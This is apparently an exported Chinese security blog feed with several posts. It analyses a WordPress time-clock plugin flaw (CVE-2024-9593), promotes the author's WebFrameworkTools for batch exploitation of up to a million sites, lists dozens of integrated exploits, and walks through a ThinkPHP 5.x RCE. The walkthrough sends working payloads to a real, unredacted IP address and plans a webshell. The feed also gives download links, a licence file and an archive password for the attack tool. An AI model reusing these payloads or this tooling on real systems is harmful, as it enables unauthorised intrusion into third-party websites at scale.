src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411041602042.png" alt="互联网网站"></p><h2 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h2><p>我们在cve网站上面搜索一下编码<a href="https://www.cve.org/CVERecord?id=CVE-2024-9593">https://www.cve.org/CVERecord?id=CVE-2024-9593</a>  发现漏洞等级为8.3 级然后发现如下引用：</p><pre class="language-java" data-language="java"><code class="language-java">https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>wordfence<span class="token punctuation">.</span>com<span class="token operator">/</span>threat<span class="token operator">-</span>intel<span class="token operator">/</span>vulnerabilities<span class="token operator">/</span>id<span class="token operator">/</span><span class="token number">247e599</span>a<span class="token operator">-</span><span class="token number">74e2</span><span class="token operator">-</span><span class="token number">41d</span><span class="token number">5</span><span class="token operator">-</span>a1ba<span class="token operator">-</span><span class="token number">978</span>a807e6544<span class="token operator">?</span>source<span class="token operator">=</span>cve https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>plugins<span class="token punctuation">.</span>trac<span class="token punctuation">.</span>wordpress<span class="token punctuation">.</span>org<span class="token operator">/</span>browser<span class="token operator">/</span>time<span class="token operator">-</span>clock<span class="token operator">/</span>tags<span class="token operator">/</span><span class="token number">1.2</span><span class="token number">.2</span><span class="token operator">/</span>includes<span class="token operator">/</span>admin<span class="token operator">/</span>ajax_functions_admin<span class="token punctuation">.</span>php#L58 https<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>plugins<span class="token punctuation">.</span>trac<span class="token punctuation">.</span>wordpress<span class="token punctuation">.</span>org<span class="token operator">/</span>changeset<span class="token operator">/</span><span class="token number">3171046</span><span class="token operator">/</span>time<span class="token operator">-</span>clock#file40 </code></pre><p>我们发现time-clock 的1.2.2版本的58行存在漏洞截图如下:<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411041611473.jpg" alt="漏洞代码"></p><pre class="language-php" data-language="php"><code class="language-php"><span class="token comment">// load function</span><span class="token keyword">function</span> <span class="token function-definition function">etimeclockwp_load_function_callback</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$function</span> <span class="token operator">=</span> <span class="token function">sanitize_text_field</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'function'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//对传入参数进行过滤除了字母数字以外过滤</span><span class="token comment">// only run function is it exists</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">wp_die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">add_action</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'wp_ajax_etimeclockwp_load_function'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'etimeclockwp_load_function_callback'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">add_action</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'wp_ajax_nopriv_etimeclockwp_load_function'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'etimeclockwp_load_function_callback'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>核心代码就是如果这个函数名称存在那么使用call_user_func 调用这个函数。所以漏洞就知道了这个漏洞可以调用wordpress里面写的所有函数。我们看没有传参数的地方所以。这个漏洞必须配合wordpres 里面的某些函数才能利用成功。我们在本地搭建一个环境看看。假如本地有个testok函数代码如下:</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$function</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'function'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>               <span class="token comment">// only run function is it exists</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">function_exists</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"no function!!!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">testok</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//那么我们就可以调用这个函数并且传入参数进行利用</span> <span class="token keyword">echo</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'test'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token variable">$name</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411041620169.jpg" alt="测试代码"><br>另外我们看 1.2.3 修复漏洞方式直接删除漏洞代码。 对比一下删除了漏洞代码如下图:<br><a href="https://plugins.trac.wordpress.org/changeset?old_path=/time-clock/tags/1.2.2&amp;old=3181069&amp;new_path=/time-clock/tags/1.2.3&amp;new=3181069&amp;sfp_email=&amp;sfph_mail=">https://plugins.trac.wordpress.org/changeset?old_path=%2Ftime-clock%2Ftags%2F1.2.2&amp;old=3181069&amp;new_path=%2Ftime-clock%2Ftags%2F1.2.3&amp;new=3181069&amp;sfp_email=&amp;sfph_mail=</a></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411041627165.png" alt="红色表示删除"><br>删除漏洞代码<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411041628243.jpg" alt="1.2.3删除漏洞代码"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>综上所述改漏洞需要配合wp其他函数方可利用。并不能直接利用。直接可用可以打的phpinfo。fofa:”wp-content&#x2F;plugins&#x2F;time-clock&#x2F;“<br>另外资产也不多。工具集成一下当poc用吧。。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202411041622267.jpg" alt="fofa"></p>]]></content>
      
      
      <categories>
          
          <category> PenetrationTest </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTestingExample </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webframeworktools dll模式简单批量使用</title>
      <link href="/securitytools/2024/10/articles/039303a532fb37a7/"/>
      <url>/securitytools/2024/10/articles/039303a532fb37a7/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p> 大家在看某些小密圈或者github某些漏洞有exp我们需要批量利用不想写nuclei和xray这些东西。如何使用webframeworktools dll模式进行批量利用。我们来看从某小密圈获取到的exp poc。通过测绘工具批量导出漏洞网站。准备好批量url dllurl.txt 。由于我们没有漏洞网站所以需要打开工具 UserDllpluginExpGenerate.exe 生成利用工具。</p><h2 id="漏洞特征"><a href="#漏洞特征" class="headerlink" title="漏洞特征"></a>漏洞特征</h2><p> 此漏洞接口为xxx&#x2F;reg.php。并且源码中有password关键字和not found关键字我们通过工具生成。如下图: 主要由于没有漏洞网站并不会显示结果。生成dll并且加载进行批量利用。如下图利用成功并且结果写入到txt中。<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202410141718420.jpg" alt="生成如下图并且利用"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p> 多练习工具,相比于写xray和nuclei简单太多了。另外最好是会点代码审计语言效果更佳。今天就说到这里。后续会继续出点工具实战使用教程。</p>]]></content>
      
      
      <categories>
          
          <category> SecurityTools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PenetrationTestingExample </tag>
            
            <tag> original </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于2025年预售webframeworkTools源代码公告</title>
      <link href="/securitytools/2024/09/articles/f76f746f1b80cfc9/"/>
      <url>/securitytools/2024/09/articles/f76f746f1b80cfc9/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p> webframeworkTools 工具自2021年开始开发已经经历了3个年头。期间大家使用的觉得不错。说url条数太少。由于国内大环境所以我们开放的url条数比较少。在tg群有人提出付费购买但是由于2024年比较忙。未能开启付费我们已经发布了url为10w条的软件测试版本 exp 更新到2024-08-26 exp框架更新在2023年11月份。请到博客中自行寻找下载地址。</p><h2 id="软件100万条url实战全模块测试"><a href="#软件100万条url实战全模块测试" class="headerlink" title="软件100万条url实战全模块测试"></a>软件100万条url实战全模块测试</h2><p> 我们已经内测了在100万条url全模块测试下软件表现如下图:<br> <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202409061722641.jpg" alt="软件内测100万条url表现"><br>测试详情如下:<br>测试结束日期2024-06-14 结束时间 14:00<br>测试网站条数100万条<br>全模块耗时6天6夜<br>堪称完美测试。测试总流量434 GB。这标志着我们软件在100万网站的url下表现很完美。定最大url条数100万条。接下来会对漏洞进行优化避免出现误报情况。😏😏😏😏😏😏。接下来调整完毕后在进行一次测试。然后以后我们将专注漏洞漏洞越多越好。因为数量上已经足够了我们最起码可以自动化攻击100万个网站。。测试详细参数<br>测试cpu Intel(R) Xeon(R) CPU E5-2620 0 @ 2.00GHz (2个处理器)<br>服务器 windows Server 2019 Standard<br>操作系统:64位操作系统,基于x64 的处理器<br>内存:64.0GB(63.8 GB可用)<br>下载速度:1-2MB&#x2F;s 我们是用事实说话从来不说我们的软件牛逼。市面上可以承载百万url不奔溃的少之又少。所以后续是集成越来越多漏洞。一体化批量全球。批量全球我们是认真的。现在缺的就是漏洞和时间更多的是缺时间哈哈哈<br><br/><br>也就是说我们的软件最大可以搭载100万条url进行全模块自动化攻击。并且速度也很快。<br>源代码截图:<br>预售源代码截图:<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202409061729585.png" alt="源代码1"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202409061729307.png" alt="源代码2"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202409061730582.png" alt="源代码3"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>关于软件我就不多介绍了可以看博客或者github的介绍。另外绝大多数bug已经修复完毕。俗话说授人鱼不如授人以渔。我们2025年打算授人以渔。将开启webframeworktools源代码预售。目前计划最大预售套数为50套。其中包含2套源代码一套是测试exp的代码。另外一套是搭载exp的代码也就是webframeworkTools V5.3 发布版本。另外购买代码的需要会渗透测试,能看懂http报文这个不会的话后续我们但是可以给你说说。渗透测试这个必须你们自己得会。毕竟2024年了不会编程也不行你们说呢 第一:编程语言建议学习c# 另外如果比较难学觉得c#你们就学习php语言编程要必须学习。第二:另外必须要熟悉软件使用方式。⚠️⚠️两个硬性条件必须要达到才有资格购买⚠️⚠️。详情请见频道。</p>]]></content>
      
      
      <categories>
          
          <category> SecurityTools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> original </tag>
            
            <tag> PenetrationTest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>webframeworktools 漏洞集成公告一</title>
      <link href="/securitytools/2024/08/articles/f7e10f7c4ce3b984/"/>
      <url>/securitytools/2024/08/articles/f7e10f7c4ce3b984/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞更新情况"><a href="#漏洞更新情况" class="headerlink" title="漏洞更新情况"></a>漏洞更新情况</h2><p>漏洞更新如下:<br/><br>  更新时空erpshiro 反序列化漏洞 erp<br/><br> 友点cms上传漏洞<br/><br> hospital后勤系统上传漏洞  hospital<br/><br> 大华智慧园区bitmap上传漏洞<br/><br> 泛微任意文件读取漏洞。泛微任意用户登录绕过<br/><br> 联达OA上传漏洞(不知名oa)<br/><br> 鸿宇多用户商城 user.php 反序列化漏洞<br/><br> 泛微e-office发序列化漏洞<br/><br> 太阳能系统DataCube3(cve)<br/><br> wordpress ticket 文件上传漏洞<br/><br> wordpress booking 代码执行<br/><br> 蓝凌智慧协同平台eis 文件上传漏洞<br/><br> 可视化融合指挥调度平台上传漏洞<br/><br> JeeSpringCloud uploadFile.jsp 文件上传<br/><br> 用友U8 cloud servicedispatcher 反序列化rce漏洞 yongyouu8<br/><br> 用友GRP-U8 operOriztion SQL注入漏洞<br/><br> 用友GRP-U8 fastjson 漏洞<br/><br> 富通天下外贸ERP任意文件上传漏洞<br/><br> 普元eos 反序列化漏洞<br/><br> 迅饶科技 X2View物联网设备存在任意用户添加漏洞<br/><br> 中成科信票务管理平台任意文件上传漏洞<br/><br> 魔方网表ERP存在文件上传漏洞<br/><br> 电信网关配置管理系统RCE<br/><br> H5云商城-任意文件上传(othercms)<br/><br> 红海任意文件上传(othersystem)<br/><br> 微擎系统-任意文件上传-AccountEdit(站很少没啥用容易修改配置 未集成)<br/><br> 微厦在线学习平台OrganSetup存在任意文件上传漏洞(可能会触发问题未集成)<br/><br> 分诊叫号系统任意文件上传漏洞(医院)<br/><br> 泛微e-cology OA action.jsp 文件上传漏洞<br/><br> 申欧录音系统rce漏洞<br/><br> wordpress CVE-2024-5084 上传漏洞<br/><br> 万户ezEip 上传漏洞,反序列化漏洞<br/><br> LyLme Spage上传漏洞<br/><br> 泛微OA-E-Mobile移动管理平台lang2sql任意文件上传漏洞<br/><br> 迈普多命令执行漏洞<br/><br> 云匣子堡垒机 fastjson漏洞<br/><br>Hikvision综合安防管理平台  applyAutoLoginTicket任意代码执行    <br/><br>Hikvision综合安防管理平台  applyCT任意代码执行    <br/><br>Hikvision综合安防管理平台  config-properties信息泄露    <br/><br>Hikvision综合安防管理平台  env信息泄露    <br/><br>Hikvision综合安防管理平台  find信息泄露    <br/><br>Hikvision综合安防管理平台  keepAlive任意代码执行      <br/><br>Hikvision综合安防管理平台  session任意代码执行       <br/><br>Hikvision综合安防管理平台  env_heapdump信息泄露    <br/><br>CVE-2024-4577 php cgi 远程命令执行<br/><br>CVE-2024-23692 HFS 远程命令执行<br/><br>课交单对接平台sql注入<br/><br>新增tp5 内置三种常用getshell方式。由于日志方式这个比较复杂将会在这三种方式都不管用的情况下使用日志方式手工getshell。<br/><br> yzmcms rce漏洞<br/><br> 和丰山海-数字标牌 任意文件上传<br/><br> Chatgpt ai 弱口令<br/><br> NetMizer RCE<br/><br> X-NAS&#x2F;Main RCE漏洞<br/><br> pyq 上传漏洞<br/><br> 极验xx任意文件读取漏洞<br/><br> 短视频系统漏洞<br/><br> geoserver 远程命令执行<br/><br> ZXUi 文件上传漏洞<br/><br> jx彩票漏洞<br/><br> h*y发卡平台漏洞<br/><br> jy cat 系统上传漏洞<br/><br> qt 交易所漏洞<br/><br> 3g shop 漏洞<br/><br> jeecgboot漏洞<br/><br> EKing-管理易 FileUpload存在任意文件上传漏洞<br/><br> Apace OFBiz 授权不当致远程代码执行漏洞(CVE-2024-38856)<br/><br> H3C iMC智能管理中心byod_index.xhtml远程代码执行漏洞<br/><br> pbootcms rce漏洞<br/><br> 同享人力资源管理系统-任意文件上传<br/><br> 赛蓝企业管理系统-任意文件上传-SubmitUploadify<br/><br> 瑞斯康达-多业务智能网关-远程命令执行<br/><br> 喰星云-数字化餐饮服务系统任意用户添加漏洞<br/><br> 时空智友ERP-任意文件上传<br/><br> App托管服务分发平台-任意文件上传<br/><br> 禅道任意用户添加漏洞<br/><br> 金慧-综合管理信息系统-SQL注入<br/><br> PEPM系统存在远程代码执行漏洞<br/><br> LiveBOS 任意文件上传漏洞<br/><br> 智慧校园(安校易)管理系统 任意文件上传<br/><br> 中小学智慧校园信息管理系统 任意文件上传<br/><br> 章管家 saveUser.htm 任意用户创建漏洞<br/><br> ALR-F800命令执行漏洞<br/><br> 赛企业管理系统 AuthToken&#x2F;Index 身份认证绕过漏洞<br/><br> 云时空社会化商业ERP系统 user&#x2F;online 身份认证绕过漏洞<br/><br> WookTeam sql注入和xxx漏洞<br/><br> 九思OA文件读取漏洞<br/><br> 用友U8-CRM import任意文件上传漏洞<br/><br> 息AI网络运维平台RCE<br/><br> 泛微  e-cology 9 sql注入漏洞<br/><br> 蓝凌EKP存在sys_ui_component远程命令执行漏洞<br/><br> 杭州三汇网debug rce<br/><br> 用友NC系统FileManager任意文件上传<br/><br> 赛通文档安全管理系统getAllUsers信息泄露<br/><br> 某服装品牌系统任意文件上传<br/><br> 指挥调度平台rce漏洞(绕过waf)<br/><br> 致远OA任意文件上传漏洞<br/><br> 致远互联FE 任意文件上传<br/><br> 教学视频应用云任意文件上传<br/><br> 潮GS企业管理软件反序列化<br/></p><p>预计hw结束后放出最大条数10万条的软件并且集成最新漏洞exp。敬请期待!!!。框架为2024-04 exp为最新版本</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202408261636141.png" alt="最新版本截图"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202408261639801.png" alt="模块列表一"></p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202408261638819.png" alt="模块列表二"></p><h2 id="软件介绍"><a href="#软件介绍" class="headerlink" title="软件介绍"></a>软件介绍</h2><p>WebFrameworkTools 5.3 - 红队综合渗透测试利器<br>来源网站: <a href="https://blog.csdn.net/gitblog_00073/article/details/139490114">https://blog.csdn.net/gitblog_00073/article/details/139490114</a></p><p><strong>项目介绍</strong></p> <p>WebFrameworkTools 是一款强大的红队渗透测试工具&#xff0c;专为专业安全研究人员和渗透测试者设计。它集成了多种Web漏洞的POC和EXP&#xff0c;旨在简化和加速Web应用的安全评估过程。软件的最新版本5.3带来了诸多改进和新的漏洞库&#xff0c;使得安全专家能够快速响应新出现的威胁。</p> <p><strong>项目技术分析</strong></p> <p>该工具基于C#编程语言构建&#xff0c;其核心特性包括&#xff1a;</p> <ol><li><strong>一键生成利用EXP</strong>: 即使不具备编程背景的用户也能轻松生成exploit。</li><li><strong>自定义DLL功能</strong>: 对于有经验的开发者来说&#xff0c;可以通过编写自己的插件来扩展工具功能。</li><li><strong>内置漏洞库</strong>: 包含了大量的Web漏洞exploits&#xff0c;涵盖各种流行框架和平台。</li><li><strong>模块内部化</strong>: 优化了软件结构&#xff0c;减小体积&#xff0c;便于携带和使用。</li><li><strong>支持.NET Core线程池</strong>: 提高性能&#xff0c;增强DLL执行效率。</li><li><strong>智能HTTP头部Fuzzer</strong>: 帮助识别潜在的脆弱点。</li><li><strong>自动化漏洞检测</strong>: 可处理大量URL&#xff0c;实现大规模测试。</li></ol> <p><strong>应用场景</strong></p> <p>WebFrameworkTools适用于以下场景&#xff1a;</p> <ol><li><strong>企业安全建设</strong>: 用于合法授权的安全测试&#xff0c;帮助加强系统防护。</li><li><strong>渗透测试</strong>: 快速验证Web应用中的安全漏洞&#xff0c;有效提升测试效率。</li><li><strong>教育研究</strong>: 学习Web安全和渗透测试技巧&#xff0c;实践安全攻防。</li><li><strong>安全应急响应</strong>: 当新漏洞披露时&#xff0c;快速对目标环境进行安全扫描。</li></ol> <p><strong>项目特点</strong></p> <ol><li><strong>高度集成</strong>: 将多种工具&#xff08;如Vulmap、Http Fuzzer和Exploit Generator&#xff09;的功能融为一体&#xff0c;实现多功能一站式操作。</li><li><strong>便捷易用</strong>: 用户友好界面和一键式操作降低了使用门槛。</li><li><strong>持续更新</strong>: 持续跟进最新的漏洞信息&#xff0c;保持漏洞数据库的实时性。</li><li><strong>源代码安全</strong>: 开源计划即将启动&#xff0c;用户可审查代码确保透明度和安全性。</li><li><strong>合规性</strong>: 明确使用条款&#xff0c;强调合法使用&#xff0c;保护用户免受法律风险。</li></ol> <p><strong>结论</strong></p> <p>WebFrameworkTools 5.3以其全面的功能和易用性&#xff0c;成为了红队渗透测试领域的一款必备工具。无论是新手还是经验丰富的安全专家&#xff0c;都能从中受益。随着源代码即将对外开源&#xff0c;更多安全社区的贡献将会进一步丰富和完善这个项目。如果你从事相关领域的工作&#xff0c;不妨尝试一下WebFrameworkTools&#xff0c;让安全测试变得更加高效。</p>               <p>使用方式请参考博客或者github。或者加入频道。<br>下载地址:<br><a href="https://www.upload.ee/files/16822507/hwok.7z.html">https://www.upload.ee/files/16822507/hwok.7z.html</a> 软件4月份版本exp更新至最新版本。框架是4月份的这个版本达到一定程度就会出现奔溃。所以设置了最大条数5000条。2024-10-31日软件过期。慢慢用吧。就别分享了自己用就行了。授权文件下载:<a href="https://www.upload.ee/files/16851948/license.7z.html">https://www.upload.ee/files/16851948/license.7z.html</a> 解压密码:GL@kEzDu&amp;lh7 注意:下载的时候有广告如果弹到别的网站关闭。回到原来的地方在点击下载。直到弹出hwok.7z才是真正下载的软件。另一个也一样。自己琢磨吧。</p><h2 id="软件已经发布最新版本最新版本上述漏洞exp全部集成并且exp更新到2024-08-26"><a href="#软件已经发布最新版本最新版本上述漏洞exp全部集成并且exp更新到2024-08-26" class="headerlink" title="软件已经发布最新版本最新版本上述漏洞exp全部集成并且exp更新到2024-08-26"></a>软件已经发布最新版本最新版本上述漏洞exp全部集成并且exp更新到2024-08-26</h2><p>软件最新版本界面:</p><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202408311201633.png" alt="软件最新版本界面"></p><p>软件下载地址:<br> <a href="https://www.upload.ee/files/17043937/webframeworkstools-10w-new.7z.html">https://www.upload.ee/files/17043937/webframeworkstools-10w-new.7z.html</a> (无bug版本)<br/><br>软件key下载地址:<br>  <a href="https://www.upload.ee/files/17043398/license-10w.7z.html">https://www.upload.ee/files/17043398/license-10w.7z.html</a> (key 10w条)<br/><br>另外dll生成工具如果不能使用下载 5.3 beta版本中的修改本地时间就可以使用了。没有单独生成dll生成器。注意!!!之前下载的版本存在bug请重新下载 无bug版本和key10 w条软件和key。</p>]]></content>
      
      
      <categories>
          
          <category> SecurityTools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> original </tag>
            
            <tag> PenetrationTest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>thinkphp 5.x rce 打法总结(一)</title>
      <link href="/penetrationtest/2024/07/articles/9c5868b69dac664d/"/>
      <url>/penetrationtest/2024/07/articles/9c5868b69dac664d/</url>
      
        <content type="html"><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>大家在使用我们的工具中,反应说扫描出来有漏洞但是就是不会打。以前说实话我也没怎么搞过thinkphp的站点。正好趁着大家反应的问题实战一下。顺便把这个编写到工具里面方便自动化。但是并不是能打所有的站只是能打部分站点这些打法。后续等工具实战话多的时候我们在总结比较好的通用方法。当然下面总结的都是互联网我只不过是实战了一下。搜索了一波这方面的资料也不少。但是比较分散所以特意搞了一篇文章我们来实战一下。为了大家都可以学会。我们有的图片就不打马赛克了(使用水印代替一下)。有些是根据系统总结出来的打法。当然这都不全后续着重遇到的情形下面在总结先总结一波放出来一下。废话不多说开干。</p><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><p> 使用软件扫描出来的站点如下图:<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271402467.png" alt="软件扫描截图"><br>我们从上图可以看出软件扫描出这个站点存在漏洞。<br>我们使用brup复现一下</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cnConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 80_method=__construct&amp;method=GET&amp;filter[]=var_dump&amp;get[]=a6d3e827b198d120okhacked</span></code></pre><p>我们看回显。说明存在漏洞。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271405298.png" alt="burp测试"><br>我们看phpinfo函数被禁用没有</p><pre class="language-java" data-language="java"><code class="language-java">POST <span class="token operator">/</span>index<span class="token punctuation">.</span>php<span class="token operator">?</span>s<span class="token operator">=</span>index HTTP<span class="token operator">/</span><span class="token number">1.1</span><span class="token class-name">Host</span><span class="token operator">:</span> <span class="token number">103.106</span><span class="token number">.188</span><span class="token number">.58</span><span class="token class-name">Cache</span><span class="token operator">-</span><span class="token class-name">Control</span><span class="token operator">:</span> max<span class="token operator">-</span>age<span class="token operator">=</span><span class="token number">0</span><span class="token class-name">Upgrade</span><span class="token operator">-</span><span class="token class-name">Insecure</span><span class="token operator">-</span><span class="token class-name">Requests</span><span class="token operator">:</span> <span class="token number">1</span><span class="token class-name">User</span><span class="token operator">-</span><span class="token class-name">Agent</span><span class="token operator">:</span> <span class="token class-name">Mozilla</span><span class="token operator">/</span><span class="token number">5.0</span> <span class="token punctuation">(</span><span class="token class-name">Windows</span> NT <span class="token number">10.0</span><span class="token punctuation">;</span> <span class="token class-name">Win64</span><span class="token punctuation">;</span> x64<span class="token punctuation">)</span> <span class="token class-name">AppleWebKit</span><span class="token operator">/</span><span class="token number">537.36</span> <span class="token punctuation">(</span>KHTML<span class="token punctuation">,</span> like <span class="token class-name">Gecko</span><span class="token punctuation">)</span> <span class="token class-name">Chrome</span><span class="token operator">/</span><span class="token number">122.0</span><span class="token number">.6261</span><span class="token number">.95</span> <span class="token class-name">Safari</span><span class="token operator">/</span><span class="token number">537.36</span><span class="token class-name">Accept</span><span class="token operator">:</span> text<span class="token operator">/</span>html<span class="token punctuation">,</span>application<span class="token operator">/</span>xhtml<span class="token operator">+</span>xml<span class="token punctuation">,</span>application<span class="token operator">/</span>xml<span class="token punctuation">;</span>q<span class="token operator">=</span><span class="token number">0.9</span><span class="token punctuation">,</span>image<span class="token operator">/</span>avif<span class="token punctuation">,</span>image<span class="token operator">/</span>webp<span class="token punctuation">,</span>image<span class="token operator">/</span>apng<span class="token punctuation">,</span><span class="token operator">*</span><span class="token comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7Accept-Encoding: gzip, deflate, brAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=bckbfn53ss1cgm1crhs1pirft7; think_var=zh-cnConnection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 68_method=__construct&amp;filter[]=call_user_func&amp;method=get&amp;get[]=phpinfo</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202407271408949.png" alt="说明没有被禁用正常"><br>但是我们看到disable_functions  我们看到几乎吧代码执行函数全部禁用了。我们看到上面php是 7.0没禁用assert所以可以直接使用assert getshell</p><pre class="language-java" data-language="java"><code class="language-java">passthru<span class="token punctuation">,</span>exec<span class="token punctuation">,</span>system<span class="token punctuation">,</span>putenv<span class="token punctuation">,</span>chroot<span class="token punctuation">,</span>chgrp<span class="token punctuation">,</span>chown<span class="token punctuation">,</span>shell_exec<span class="token punctuation">,</span>popen<span class="token punctuation">,</span>proc_open<span class="token punctuation">,</span>pcntl_exec<span class="token punctuation">,</span>ini_alter<span class="token 